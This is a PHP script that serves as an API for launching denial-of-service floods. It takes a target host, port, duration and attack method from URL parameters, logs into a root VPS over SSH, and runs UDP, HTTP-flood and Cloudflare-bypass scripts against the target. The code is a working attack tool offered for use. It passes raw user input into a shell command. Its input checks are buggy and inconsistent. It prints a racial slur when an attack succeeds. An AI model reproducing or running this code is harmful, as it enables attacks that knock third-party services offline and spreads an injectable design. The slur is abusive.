
//                                      (_)
// _____   _ _ __ __ _ ___    __ _ _ __  _ 
// |_  / | | | '__/ _` / __|  / _` | '_ \| |
//  / /| |_| | | | (_| \__ \ | (_| | |_) | |
// /___|\__,_|_|  \__,_|___/  \__,_| .__/|_|
//                                 | |      
//                                 |_|
   
<?php
ignore_user_abort(true);
set_time_limit(0);
 //your vps ip
$server_ip = "yourvpsip"; 
//your vps password
$server_pass = "root123"; 
//change it when u're using other user than root
$server_user = "root"; 
 

$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
$action = $_GET['action'];
 

// add methods there
$array = array("udp", "cf", "http-raw", "fivem-ovh", "http-flood", "stop");
//your's api key 
$ray = array("zuras");
 
//checks if api key is empty
if (!empty($key)){
}else{
die('Error: API key is empty!');}
 
//api key is not correct 
if (in_array($key, $ray)){ 
}else{
die('Error: Incorrect API key!');}
 
//checks if time is empty
if (!empty($time)){
}else{
die('Error: time is empty!');}
 
//checks if host is empty
if (!empty($host)){
}else{
die('Error: Host is empty!');}
//checks if method is empty
if (!empty($method)){
}else{
die('Error: Method is empty!');}
 
//checks if method is wrong
if (in_array($method, $array)){
}else{
die('Error: The method you requested does not exist!');}
// ports over 44405 do not exist
if ($port > 44405){
die('Error: Ports over 44405 do not exist');}
 
//max time       
if ($time > 2000){
die('Error: Cannot exceed 36000 seconds!');} 
 
if(ctype_digit($Time)){
die('Error: Time is not in numeric form!');}
 
if(ctype_digit($Port)){
die('Error: Port is not in numeric form!');}
 
// attack methods
if ($method == "udp") { $command = "screen -dm perl /root/ssyn.pl $host $port 50000 $time"; }
if ($method == "http-flood") { $command = "screen -dm perl /root/http-flood.pl $host $port 300000 $time 8.8.8.8"; }
if ($method == "cf") { $command = "screen -dm timeout $time node cf.js $host $time 300000"; }
if ($method == "http-raw") { $command = "screen -dm timeout $time node http-raw.js $host $port $time"; }
if ($method == "stop") { $command = "pkill $host -f"; }
//checks if vps has installed ssh2 
if (!function_exists("ssh2_connect")) die("Error: SSH2 does not exist on you're server");
if(!($con = ssh2_connect($server_ip, 22))){
  echo "Error: Connection Issue";
} else {
 
//login is not correct
    if(!ssh2_auth_password($con, $server_user, $server_pass)) {
        echo "Error: Login failed, one or more of you're server credentials are incorect.";
    } else {
       
//vps couldn't send attack bc of command for method 
        if (!($stream = ssh2_exec($con, $command ))) {
            echo "Error: You're server was not able to execute you're methods file and or its dependencies";
        } else {
//sent attack     
            stream_set_blocking($stream, false);
            $data = "";
            while ($buf = fread($stream,4096)) {
                $data .= $buf;
            }
            echo "nigga died xaxaxaxaxa</br>[host: $host] [port: $port] [time: $time] [Method: $method]";
            fclose($stream);
        }
    }
}
?>
